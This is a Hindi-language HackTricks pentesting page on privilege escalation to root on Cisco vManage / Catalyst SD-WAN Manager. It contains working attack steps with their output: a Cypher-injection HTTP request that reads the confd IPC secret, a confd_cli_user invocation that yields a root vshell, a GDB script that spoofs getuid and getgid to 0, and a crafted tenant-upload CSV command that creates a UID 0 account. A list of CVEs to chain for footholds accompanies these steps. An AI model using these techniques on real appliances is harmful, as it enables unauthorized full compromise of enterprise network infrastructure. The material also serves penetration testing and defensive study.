# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

एक बार Cisco vManage / *Catalyst SD-WAN Manager* पर `vmanage`, `netadmin`, या `vmanage-admin` के रूप में code execution प्राप्त हो जाए, तो सबसे दिलचस्प local privesc surfaces आमतौर पर `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs, और root-owned import/upload handlers होते हैं।

यदि आपको अभी भी controller पर **initial foothold** की आवश्यकता है, तो पहले dedicated control-plane page देखें:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
यदि आपके foothold से `/etc/confd/confd_ipc_secret` readable है, तो Path 1 और Path 2 तुरंत practical हो जाते हैं। यदि आप किसी remote info leak या webshell के माध्यम से आए हैं, तो यह भी जाँचें कि क्या आप पहले से `vmanage-admin` SSH material या multitenancy upload handlers तक पहुँच सकते हैं: 2026 के research से पता चला कि दोनों realistic stepping stones थे।

## Path 1

([https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) से उदाहरण)

`confd` और अलग-अलग binaries से संबंधित कुछ [documentation](http://66.218.245.39/doc/html/rn03re18.html) को थोड़ा देखने के बाद (जो Cisco website पर account के साथ accessible है), हमें पता चला कि IPC socket को authenticate करने के लिए यह `/etc/confd/confd_ipc_secret` में स्थित secret का उपयोग करता है:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
हमारे Neo4j instance को याद है? यह `vmanage` user के privileges के अंतर्गत चल रहा है, जिससे हमें previous vulnerability का उपयोग करके file retrieve करने की अनुमति मिलती है:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` प्रोग्राम command line arguments को support नहीं करता, बल्कि arguments के साथ `/usr/bin/confd_cli_user` को call करता है। इसलिए, हम अपने arguments के set के साथ सीधे `/usr/bin/confd_cli_user` को call कर सकते हैं। हालांकि, हमारे वर्तमान privileges के साथ यह readable नहीं है, इसलिए हमें इसे rootfs से retrieve करके scp का उपयोग करके copy करना होगा, help पढ़नी होगी और इसका उपयोग shell प्राप्त करने के लिए करना होगा:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv team के blog¹ में root shell प्राप्त करने का एक शानदार तरीका बताया गया है, लेकिन इसकी कमी यह है कि इसके लिए `/usr/bin/confd_cli_user` की एक copy प्राप्त करनी पड़ती है, जिसे केवल root ही पढ़ सकता है। मुझे ऐसी परेशानी के बिना root तक escalate करने का एक और तरीका मिला।

जब मैंने `/usr/bin/confd_cli` binary को disassemble किया, तो मैंने निम्नलिखित देखा:

<details>
<summary>UID/GID collection दिखाने वाला Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

जब मैं “ps aux” चलाता हूं, तो मैंने निम्नलिखित देखा (_ध्यान दें -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
मैंने अनुमान लगाया कि “confd_cli” प्रोग्राम logged in user से प्राप्त user ID और group ID को “cmdptywrapper” application में भेजता है।

मेरा पहला प्रयास “cmdptywrapper” को सीधे चलाने और इसे `-g 0 -u 0` देने का था, लेकिन यह विफल रहा। ऐसा प्रतीत होता है कि इस प्रक्रिया के दौरान कहीं एक file descriptor (-i 1015) बनाया गया था और मैं इसे fake नहीं कर सकता।

जैसा कि synacktiv के blog (last example) में बताया गया है, `confd_cli` प्रोग्राम command line argument को support नहीं करता, लेकिन मैं debugger के माध्यम से इसे प्रभावित कर सकता हूं और सौभाग्य से system में GDB शामिल है।

मैंने एक GDB script बनाया, जिसमें API `getuid` और `getgid` को 0 return करने के लिए force किया। चूंकि deserialization RCE के माध्यम से मेरे पास पहले से “vmanage” privilege है, इसलिए मुझे `/etc/confd/confd_ipc_secret` को directly read करने की permission है।

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>कंसोल आउटपुट</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco ने बाद में [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) के लिए अपनी advisory में एक अधिक साफ़ local root path document किया: **केवल read-only privileges वाले authenticated attacker** अपर्याप्त input validation के कारण manager CLI को crafted request भेजकर root तक पहुँच सकते थे।

Offensive perspective से महत्वपूर्ण takeaway यह है:

1. एक बार box पर *कोई भी* low-priv foothold मिल जाने के बाद, भारी Path 1 / Path 2 workflow अपनाने से पहले local CLI service को test करें।
2. Trust boundary खोजने के लिए Path 2 के artifacts दोबारा इस्तेमाल करें: `confd_cli` → `cmdptywrapper` → `vshell`।
3. CLI backend को forward किए जाने वाले हर field को suspicious मानें: UID/GID, username, terminal metadata, imported files, या कोई भी value जिसे बाद में root-owned helper consume करता हो।
4. यदि कोई low-priv user local CLI socket तक पहुँच सकता है और इन fields को influence कर सकता है, तो root केवल एक crafted request की दूरी पर हो सकता है।

Appliance पर land करने के बाद practical workflow यह है:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
यह 2025 bug को समान versions के लिए एक अच्छे hunting pattern में बदल देता है: **ऐसे local CLI shims खोजें जो userland में identity collect करते हैं और उसे किसी अधिक privileged wrapper को forward करते हैं**।

**CVE-2025-20122** को बाद के **CVE-2026-20122** के साथ confuse न करें: 2025 की समस्या एक *local* CLI-to-root bug है, जबकि 2026 की समस्या एक *remote* API arbitrary file overwrite है, जो मुख्यतः foothold स्थापित करने और फिर Path 1 / Path 2 / Path 4 पर वापस जाने के लिए उपयोगी है।

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco की February 2026 advisory ने एक और उपयोगी privesc class भी प्रस्तुत की: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) ने एक **authenticated, local attacker with low privileges** को root प्राप्त करने की अनुमति दी, क्योंकि REST API में user-authentication mechanism अपर्याप्त था।

यह महत्वपूर्ण है क्योंकि vManage privesc अब केवल `confd`/TTY abuse तक सीमित नहीं है। Low-priv shell प्राप्त करने के बाद, इन चीज़ों को भी hunt करें:

- localhost-only API endpoints, जो caller पर जरूरत से ज्यादा trust करते हों
- current account से readable tokens, cookies या service credentials
- `dataservice`/REST handlers के माध्यम से exposed root-only actions, जिन्हें अभी भी locally trigger किया जा सकता हो

व्यवहार में, एक बार `vmanage` या किसी अन्य service user के रूप में shell मिल जाने पर, local API abuse interactive CLI abuse की तुलना में अक्सर अधिक शांत और automate करने में आसान होता है:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
यदि local session context privileged REST functionality तक पहुंचने के लिए पर्याप्त है, तो API path को प्राथमिकता दें: इसे replay और script करना आसान है, और इसे चुराए गए web sessions या API tokens के साथ chain किया जा सकता है।

## Path 5 (2026 में root द्वारा processed crafted file - CVE-2026-20245)

एक अन्य recent pattern [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) है: `netadmin` privileges वाला local attacker एक **crafted file** upload कर सकता था, जिसे CLI ने बाद में असुरक्षित तरीके से handle किया और इसके परिणामस्वरूप `root` के रूप में command injection संभव हुआ।

HackTricks के दृष्टिकोण से, मूल्यवान technique केवल specific CVE तक सीमित नहीं है:

1. हर उस CLI या web workflow को enumerate करें जो file स्वीकार करता है: imports, diagnostic bundles, templates, validators, backups, tenant data आदि।
2. पता लगाएं कि uploaded file कहां पहुंचती है और कौन-सी root-owned script या binary उसे consume करती है।
3. जांचें कि filename, file content या parsed metadata को कभी shell commands, wrapper scripts या `system()`-style helpers में pass किया जाता है या नहीं।
4. यदि आप पहले से `netadmin` तक पहुंच सकते हैं (valid creds, stolen session या auth-bypass chain के माध्यम से), तो file-processing bugs अक्सर root तक पहुंचने का सबसे तेज़ path होते हैं।

Google Cloud / Mandiant ने बाद में multitenancy import path के माध्यम से exploit किए जा रहे इस bug class का एक बहुत ठोस instance दिखाया:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
देखे गए attack में, तैयार की गई CSV ने `/etc/passwd` और `/etc/shadow` में बदलाव करके एक अस्थायी UID 0 account (`troot`) बना दिया। इससे `tenant-upload` / `tenant-list` जैसे importers विशेष रूप से दिलचस्प हो जाते हैं: ये केवल data-ingestion features नहीं हैं, बल्कि संभावित root-owned parser front-ends हैं।

Shell-side hunting pattern इस प्रकार है:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
यह bug class विशेष रूप से उन remote footholds के साथ अच्छी तरह chain होती है जो `netadmin` देते हैं, लेकिन `root` नहीं।

## Chain करने के लिए अन्य हालिया vManage/Catalyst SD-WAN Manager vulns

- **Unauthenticated info leak (CVE-2026-20133)** – यह खास तौर पर high-value है क्योंकि public research से पता चला कि इससे `confd_ipc_secret` या `vmanage-admin` private key expose हो सकती है, जिससे read bug को Path 1 या NETCONF pivot में बदला जा सकता है।
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – यह ऊपर दिए गए 2025 CLI bug से अलग है; VulnCheck ने इसका उपयोग webshell upload करने के लिए किया, जिससे इस page के local privesc paths तुरंत relevant हो जाते हैं।
- **Authenticated UI XSS (CVE-2024-20475)** – web UI में admin session चुराएँ, फिर API/CLI actions में pivot करें, जो अंततः `vshell` या ऊपर दिए गए local privesc paths तक पहुँचते हैं।
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – यह Path 5 के लिए बहुत मजबूत precursor है क्योंकि `netadmin` वही level है जिसकी 2026 crafted-file privesc को आवश्यकता होती है।
- **Authenticated arbitrary file write (CVE-2026-20262)** – CVE-2026-20122 के समान offensive value, लेकिन बाद के web UI upload path के माध्यम से: ऐसी location में write करें जिसे बाद में root या management-plane web tier parse करेगा।
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions से पता चला कि attackers पुराने vulnerable SD-WAN build पर rollback कर सकते हैं, पुराने CLI root bug का abuse कर सकते हैं और फिर original version restore कर सकते हैं।
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – इसका बेहतर documentation dedicated SD-WAN control-plane page में है; यह `vmanage-admin` के लिए SSH key append कर सकता है, जिससे आपको इस page पर वापस आने के लिए आवश्यक local foothold मिल जाता है।



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
